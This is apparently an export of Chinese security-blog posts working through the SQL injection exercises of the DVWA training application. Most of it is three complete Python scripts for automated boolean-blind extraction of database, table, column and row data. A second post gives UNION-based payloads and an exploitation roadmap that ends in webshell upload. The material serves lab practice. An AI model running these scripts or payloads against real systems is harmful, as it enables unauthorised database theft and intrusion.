&quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.word_length) else: print(&#39;\ncan not get the word length&#39;) 获取数据 def get_word_name(self,table_name,column_name,word_num): name = &#39;&#39; for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process(&#39;get_{0}_name&#39;.format(str(i)),j,100) theurl = self.url + &quot;1&#39; and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23&quot;.format(column_name,str(i),table_name,str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; self.word_name.append(name) print(&#39;\n==&gt;&#39;,self.word_name[word_num]) 运行结果： MJAW4J.png 级别：mediumSQL Injection (Blind) Source&lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_POST[ &#39;id&#39; ]; $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } //mysql_close(); } ?&gt; 分析medium级别与low级别差不多， 将get方式改成post方式即可，数字型注入。 由于他会过滤单引号，所以需要转成16进制。 def tranhex(self,str1): result = &#39;0x&#39; for i in str1: result += hex(ord(i))[2:] return result 运行结果： MJmPQs.png MJmaSH.png 级别：highSQL Injection (Blind) Source&lt;?php if( isset( $_COOKIE[ &#39;id&#39; ] ) ) { // Get input $id = $_COOKIE[ &#39;id&#39; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析随便写个1提交 MJunM9.png 是一个cookie注入 def get_headers(self,payload): headers = { &#39;Cookie&#39;: &quot;id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c&quot;.format(payload) } 运行结果： MYZAMR.png 完整脚本from Injection import Injection def main(url): Injection(url).run() if __name__ == &#39;__main__&#39;: url = &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli_blind/?id=&quot; main(url low:import requests import string class Injection: def __init__(self,url): self.url = url self.s = requests.session() self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36] self.headers = { &#39;Cookie&#39;: &#39;security=low; PHPSESSID=ms11imgpftrmfcp27rmk9s006c&#39; } def process(self,yourstr,num1,num2): print(&quot;[+] Please wait ... {0} [{1}]/[{2}]&quot;.format(yourstr,str(num1),str(num2)),end=&#39;\r&#39;) def check(self,text): if &quot;User ID exists in the database.&quot; in text: return True elif &quot;User ID is MISSING from the database.&quot; in text: return False def run(self): self.get_itsnum() self.get_database_length() self.get_database() self.get_table_num() self.table_length = [] self.table_name = [] self.get_table_length() self.get_table_name() table_name = input(&#39;[-] table_name: &#39;) self.get_column_num(table_name) self.column_length = [] self.column_name = [] self.get_column_length(table_name) self.get_column_name(table_name) column_names = input(&#39;[-] column_name: &#39;).split(&#39;,&#39;) self.word_num = 0 self.get_word_num(table_name,column_names[0]) self.word_name = [] self.word_length = [] for i in range(len(column_names)): print(column_names[i]) self.get_word_length(table_name,column_names[i]) self.get_word_name(table_name,column_names[i],i) def get_itsnum(self): self.itsnum = 0 for i in range(1,50): self.process(&#39;get_itsnum&#39;,i,50) theurl = self.url + &quot;1&#39; order by {0}%23&quot;.format(str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if not self.check(html): self.itsnum = i - 1 break if self.itsnum &gt; 0: print(&#39;\n==&gt;&#39;,self.itsnum) else: print(&quot;\ncan not get the itsnum&quot;) def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process(&#39;get_database_length&#39;,i,30) theurl = self.url + &quot;1&#39; and length(database())={0}%23&quot;.format(str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print(&#39;\n==&gt;&#39;,self.database_length) else: print(&quot;\ncan not get the database_length&quot;) def get_database(self): self.database = &#39;&#39; for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + &#39; get_database&#39;,j,self.database_length+1) theurl = self.url + &quot;1&#39; and ascii(substring(database(),{0},1))={1}%23&quot;.format(str(i),str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += &#39;666&#39; if len(self.database) &gt; 0: print(&#39;\n==&gt;&#39;,self.database) else: print(&quot;\n can not get the database&quot;) def get_table_num(self): self.table_num = 0 for i in range(1,30): self.process(&#39;get_table_num&#39;,i,30) theurl = self.url + &quot;1&#39; and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})%23&quot;.format(str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.table_num = i break if self.table_num &gt; 0: print(&#39;\n==&gt;&#39;,self.table_num) else: print(&quot;\ncan not get the table_num&quot;) def get_table_length(self): for i in range(1,50): self.process(&#39;get_table_length&#39;,i,50) theurl = self.url + &quot;1&#39; and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23&quot;.format(str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print(&#39;\n==&gt;&#39;,self.table_length) else: print(&#39;\ncan not get the table_length&#39;) def get_table_name(self): name = &#39;&#39; for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_table_name&#39;.format(i),j,50) theurl = self.url + &quot;1&#39; and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23&quot;.format(str(i),str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) &gt; 0: print(&#39;\n==&gt;&#39;,name) self.table_name.append(name) else: print(&#39;\ncan not get the table_name&#39;) def get_column_num(self,table_name): self.column_num = 0 for i in range(1,30): self.process(&#39;get_column_num&#39;,i,30) theurl = self.url + &quot;1&#39; and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name=&#39;{0}&#39; having a={1})%23&quot;.format(table_name,str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print(&#39;\n==&gt;&#39;,self.column_num) def get_column_length(self,table_name): for i in range(1,100): self.process(&#39;get_column_length&#39;,i,100) theurl = self.url + &quot;1&#39; and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name=&#39;{0}&#39; having a={1})%23&quot;.format(table_name,str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.column_length) else: print(&#39;\ncan not get the column_length&#39;) def get_column_name(self,table_name): name = &#39;&#39; for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_column_name&#39;.format(str(i)),j,100) theurl = self.url + &quot;1&#39; and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name=&#39;{1}&#39; having a={2})%23&quot;.format(str(i),table_name,str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) == self.column_length[0]: self.column_name.append(name) print(&#39;\n==&gt;&#39;,self.column_name[0]) else: print(&#39;\ncan not get the column_name&#39;) def get_word_num(self,table_name,column_name): for i in range(1,100): self.process(&#39;get_word_num&#39;,i,30) theurl = self.url + &quot;1&#39; and (select count({0}) as a from {1} having a={2})%23&quot;.format(column_name,table_name,str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print(&#39;\n==&gt;&#39;,self.word_num) else: print(&#39;\ncan not get the word_num&#39;) def get_word_length(self,table_name,column_name): for i in range(1,200): self.process(&#39;get_{0}_length&#39;.format(column_name),i,200) theurl = self.url + &quot;1&#39; and (select length(group_concat({0})) as a from {1} having a={2})%23&quot;.format(column_name,table_name,str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.word_length) else: print(&#39;\ncan not get the word length&#39;) def get_word_name(self,table_name,column_name,word_num): name = &#39;&#39; for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process(&#39;get_{0}_name&#39;.format(str(i)),j,100) theurl = self.url + &quot;1&#39; and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23&quot;.format(column_name,str(i),table_name,str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; self.word_name.append(name) print(&#39;\n==&gt;&#39;,self.word_name[word_num]) mediumimport requests import string class Injection: def __init__(self,url): self.url = url self.s = requests.session() self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36] self.headers = { &#39;Cookie&#39;: &#39;security=medium; PHPSESSID=ms11imgpftrmfcp27rmk9s006c&#39; } def process(self,yourstr,num1,num2): print(&quot;[+] Please wait ... {0} [{1}]/[{2}]&quot;.format(yourstr,str(num1),str(num2)),end=&#39;\r&#39;) def check(self,text): if &quot;User ID exists in the database.&quot; in text: return True elif &quot;User ID is MISSING from the database.&quot; in text: return False def tranhex(self,str1): result = &#39;0x&#39; for i in str1: result += hex(ord(i))[2:] return result def run(self): self.get_itsnum() self.get_database_length() self.get_database() self.get_table_num() self.table_length = [] self.table_name = [] self.get_table_length() self.get_table_name() table_name = input(&#39;[-] table_name: &#39;) self.get_column_num(table_name) self.column_length = [] self.column_name = [] self.get_column_length(table_name) self.get_column_name(table_name) column_names = input(&#39;[-] column_name: &#39;).split(&#39;,&#39;) self.word_num = 0 self.get_word_num(table_name,column_names[0]) self.word_name = [] self.word_length = [] for i in range(len(column_names)): print(column_names[i]) self.get_word_length(table_name,column_names[i]) self.get_word_name(table_name,column_names[i],i) def get_itsnum(self): self.itsnum = 0 for i in range(1,50): self.process(&#39;get_itsnum&#39;,i,50) data = { &#39;id&#39;:&quot;1 order by {0}&quot;.format(str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if not self.check(html): self.itsnum = i - 1 break if self.itsnum &gt; 0: print(&#39;\n==&gt;&#39;,self.itsnum) else: print(&quot;\ncan not get the itsnum&quot;) def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process(&#39;get_database_length&#39;,i,30) data = { &#39;id&#39;:&quot;1 and length(database())={0}&quot;.format(str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print(&#39;\n==&gt;&#39;,self.database_length) else: print(&quot;\ncan not get the database_length&quot;) def get_database(self): self.database = &#39;&#39; for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + &#39; get_database&#39;,j,self.database_length+1) data = { &#39;id&#39;:&quot;1 and ascii(substring(database(),{0},1))={1}&quot;.format(str(i),str(j)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += &#39;666&#39; if len(self.database) &gt; 0: print(&#39;\n==&gt;&#39;,self.database) else: print(&quot;\n can not get the database&quot;) def get_table_num(self): self.table_num = 0 for i in range(1,30): self.process(&#39;get_table_num&#39;,i,30) data = { &#39;id&#39;:&quot;1 and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})&quot;.format(str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.table_num = i break if self.table_num &gt; 0: print(&#39;\n==&gt;&#39;,self.table_num) else: print(&quot;\ncan not get the table_num&quot;) def get_table_length(self): for i in range(1,50): self.process(&#39;get_table_length&#39;,i,50) data = { &#39;id&#39;:&quot;1 and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})&quot;.format(str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print(&#39;\n==&gt;&#39;,self.table_length) else: print(&#39;\ncan not get the table_length&#39;) def get_table_name(self): name = &#39;&#39; for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_table_name&#39;.format(i),j,50) data = { &#39;id&#39;:&quot;1 and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})&quot;.format(str(i),str(j)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) &gt; 0: print(&#39;\n==&gt;&#39;,name) self.table_name.append(name) else: print(&#39;\ncan not get the table_name&#39;) def get_column_num(self,table_name): self.column_num = 0 table_name = self.tranhex(table_name) print(table_name) for i in range(1,30): self.process(&#39;get_column_num&#39;,i,30) data = { &#39;id&#39;:&quot;1 and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})&quot;.format(table_name,str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print(&#39;\n==&gt;&#39;,self.column_num) def get_column_length(self,table_name): table_name = self.tranhex(table_name) for i in range(1,100): self.process(&#39;get_column_length&#39;,i,100) data = { &#39;id&#39;:&quot;1 and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})&quot;.format(table_name,str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.column_length) else: print(&#39;\ncan not get the column_length&#39;) def get_column_name(self,table_name): table_name = self.tranhex(table_name) name = &#39;&#39; for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_column_name&#39;.format(str(i)),j,100) data = { &#39;id&#39;:&quot;1 and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name={1} having a={2})&quot;.format(str(i),table_name,str(j)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) == self.column_length[0]: self.column_name.append(name) print(&#39;\n==&gt;&#39;,self.column_name[0]) else: print(&#39;\ncan not get the column_name&#39;) def get_word_num(self,table_name,column_name): for i in range(1,100): self.process(&#39;get_word_num&#39;,i,30) data = { &#39;id&#39;:&quot;1 and (select count({0}) as a from {1} having a={2})&quot;.format(column_name,table_name,str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print(&#39;\n==&gt;&#39;,self.word_num) else: print(&#39;\ncan not get the word_num&#39;) def get_word_length(self,table_name,column_name): for i in range(1,200): self.process(&#39;get_{0}_length&#39;.format(column_name),i,200) data = { &#39;id&#39;:&quot;1 and (select length(group_concat({0})) as a from {1} having a={2})&quot;.format(column_name,table_name,str(i)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.word_length) else: print(&#39;\ncan not get the word length&#39;) def get_word_name(self,table_name,column_name,word_num): name = &#39;&#39; for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process(&#39;get_{0}_name&#39;.format(str(i)),j,100) data = { &#39;id&#39;:&quot;1 and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})&quot;.format(column_name,str(i),table_name,str(j)), &#39;Submit&#39;:&#39;Submit&#39;, } html = self.s.post(self.url,data=data,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; self.word_name.append(name) print(&#39;\n==&gt;&#39;,self.word_name[word_num]) highimport requests import string class Injection: def __init__(self,url): self.url = url self.s = requests.session() self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36] def get_headers(self,payload): headers = { &#39;Cookie&#39;: &quot;id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c&quot;.format(payload) } return headers def process(self,yourstr,num1,num2): print(&quot;[+] Please wait ... {0} [{1}]/[{2}]&quot;.format(yourstr,str(num1),str(num2)),end=&#39;\r&#39;) def check(self,text): if &quot;User ID exists in the database.&quot; in text: return True elif &quot;User ID is MISSING from the database.&quot; in text: return False def run(self): self.get_itsnum() self.get_database_length() self.get_database() self.get_table_num() self.table_length = [] self.table_name = [] self.get_table_length() self.get_table_name() table_name = input(&#39;[-] table_name: &#39;) self.get_column_num(table_name) self.column_length = [] self.column_name = [] self.get_column_length(table_name) self.get_column_name(table_name) column_names = input(&#39;[-] column_name: &#39;).split(&#39;,&#39;) self.word_num = 0 self.get_word_num(table_name,column_names[0]) self.word_name = [] self.word_length = [] for i in range(len(column_names)): print(column_names[i]) self.get_word_length(table_name,column_names[i]) self.get_word_name(table_name,column_names[i],i) def get_itsnum(self): self.itsnum = 0 for i in range(1,50): self.process(&#39;get_itsnum&#39;,i,50) payload = &quot;1&#39; order by {0}#&quot;.format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if not self.check(html): self.itsnum = i - 1 break if self.itsnum &gt; 0: print(&#39;\n==&gt;&#39;,self.itsnum) else: print(&quot;\ncan not get the itsnum&quot;) def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process(&#39;get_database_length&#39;,i,30) payload = &quot;1&#39; and length(database())={0}#&quot;.format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print(&#39;\n==&gt;&#39;,self.database_length) else: print(&quot;\ncan not get the database_length&quot;) def get_database(self): self.database = &#39;&#39; for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + &#39; get_database&#39;,j,self.database_length+1) payload = &quot;1&#39; and ascii(substring(database(),{0},1))={1}#&quot;.format(str(i),str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += &#39;666&#39; if len(self.database) &gt; 0: print(&#39;\n==&gt;&#39;,self.database) else: print(&quot;\n can not get the database&quot;) def get_table_num(self): self.table_num = 0 for i in range(1,30): self.process(&#39;get_table_num&#39;,i,30) payload = &quot;1&#39; and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})#&quot;.format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.table_num = i break if self.table_num &gt; 0: print(&#39;\n==&gt;&#39;,self.table_num) else: print(&quot;\ncan not get the table_num&quot;) def get_table_length(self): for i in range(1,50): self.process(&#39;get_table_length&#39;,i,50) payload = &quot;1&#39; and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})#&quot;.format(str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print(&#39;\n==&gt;&#39;,self.table_length) else: print(&#39;\ncan not get the table_length&#39;) def get_table_name(self): name = &#39;&#39; for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_table_name&#39;.format(i),j,50) payload = &quot;1&#39; and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})#&quot;.format(str(i),str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) &gt; 0: print(&#39;\n==&gt;&#39;,name) self.table_name.append(name) else: print(&#39;\ncan not get the table_name&#39;) def get_column_num(self,table_name): self.column_num = 0 for i in range(1,30): self.process(&#39;get_column_num&#39;,i,30) payload = &quot;1&#39; and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name=&#39;{0}&#39; having a={1})#&quot;.format(table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print(&#39;\n==&gt;&#39;,self.column_num) def get_column_length(self,table_name): for i in range(1,100): self.process(&#39;get_column_length&#39;,i,100) payload = &quot;1&#39; and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name=&#39;{0}&#39; having a={1})#&quot;.format(table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.column_length) else: print(&#39;\ncan not get the column_length&#39;) def get_column_name(self,table_name): name = &#39;&#39; for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_column_name&#39;.format(str(i)),j,100) payload = &quot;1&#39; and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name=&#39;{1}&#39; having a={2})#&quot;.format(str(i),table_name,str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) == self.column_length[0]: self.column_name.append(name) print(&#39;\n==&gt;&#39;,self.column_name[0]) else: print(&#39;\ncan not get the column_name&#39;) def get_word_num(self,table_name,column_name): for i in range(1,100): self.process(&#39;get_word_num&#39;,i,30) payload = &quot;1&#39; and (select count({0}) as a from {1} having a={2})#&quot;.format(column_name,table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print(&#39;\n==&gt;&#39;,self.word_num) else: print(&#39;\ncan not get the word_num&#39;) def get_word_length(self,table_name,column_name): for i in range(1,200): self.process(&#39;get_{0}_length&#39;.format(column_name),i,200) payload = &quot;1&#39; and (select length(group_concat({0})) as a from {1} having a={2})#&quot;.format(column_name,table_name,str(i)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.word_length) else: print(&#39;\ncan not get the word length&#39;) def get_word_name(self,table_name,column_name,word_num): name = &#39;&#39; for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process(&#39;get_{0}_name&#39;.format(str(i)),j,100) payload = &quot;1&#39; and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})#&quot;.format(column_name,str(i),table_name,str(j)) html = self.s.get(self.url,headers=self.get_headers(payload)).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; self.word_name.append(name) print(&#39;\n==&gt;&#39;,self.word_name[word_num]) 🚩推荐阅读DVWA-SQL_Injection(SQL注入)利用sqlmap注入dvwa简单sql注入环境搭建及注入我的WafBypass之道 三篇笔记SQL注入脚本练习]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-SQL_Injection(SQL注入)]]></title>
    <url>%2F2019%2F10%2F28%2FDVWA-SQL-Injection%2F</url>
    <content type="text"><![CDATA[DVWA里的SQL注入。 SQL 注入分类 按SQLMap中的分类来看，SQL注入类型有以下 5 种： UNION query SQL injection（可联合查询注入） Stacked queries SQL injection（可多语句查询注入） Boolean-based blind SQL injection（布尔型注入） Error-based SQL injection（报错型注入） Time-based blind SQL injection（基于时间延迟注入） SQL 注入常规利用思路： 1、寻找注入点，可以通过 web 扫描工具实现 2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息） 4、可以通过获得的用户信息，寻找后台登录。 5、利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。 手工注入常规思路： 1.判断是否存在注入，注入是字符型还是数字型 2.猜解 SQL 查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.查询到账户的数据 级别：low查看源码&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 分析：由代码可知，通过REQUEST方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。 常见注入测试的POC： … where user_id = $id ——&gt; … where user_id = 1 or 1024=1024 … where user_id = ‘$id’ ——&gt; …where user_id = ‘1’ or ‘1024’=’1024’ … where user_id = “$id” ——&gt; … where user_id = “1” or “1024”=”1024” 判断是否存在注入，注入是字符型还是数字型输入1，查询成功： KgwPW6.png 输入1&#39;and &#39;1&#39; =&#39;2，查询失败，返回结果为空： KgwRt1.png 输入1&#39; or &#39;1&#39;=&#39;1 页面正常，并返回更多信息，成功查询 Kg0wEd.png 判断存在的是字符型注入。 猜解SQL查询语句中的字段数输入1&#39; or 1=1 order by 1 #，查询成功： #是注释作用 KgDOhR.png 输入1&#39; or 1=1 order by 2 #，查询成功： #是注释作用 KgrhUH.png 输入1&#39; or 1=1 order by 3 #，查询失败： #是注释作用 KgsUzt.png 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 确认显示的字段顺序 输入1&#39; union select 1,2 #，查询成功： #是注释作用 MQK7Of.png 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… 获取当前数据库 输入1&#39; union select 1,database() #，查询成功：#是注释作用 MQMl7D.png 说明当前的数据库为dvwa。 获取数据库中的表输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： #是注释作用 MQM7C9.png 说明数据库dvwa中一共有两个表，guestbook与users。 